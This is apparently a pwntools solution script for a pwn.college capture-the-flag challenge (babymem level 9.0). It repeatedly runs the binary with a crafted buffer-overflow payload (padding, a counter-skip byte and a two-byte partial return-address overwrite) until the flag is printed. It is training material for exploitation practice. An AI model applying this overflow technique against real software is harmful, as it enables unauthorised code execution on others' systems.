from pwn import *

while True:
    p = process('/challenge/babymem_level9.0')
    p.recvuntil('Payload size:')
    
    # 128+8+2=138
    p.sendline(b'138') 
    # 136=\x88
    payload=b'A'*116+b'\x87'+p16(0x1a17)

    p.sendline(payload)

    str = p.recvall(1)
    if str.find(b'pwn.college{') != -1:
        print(str)
        break

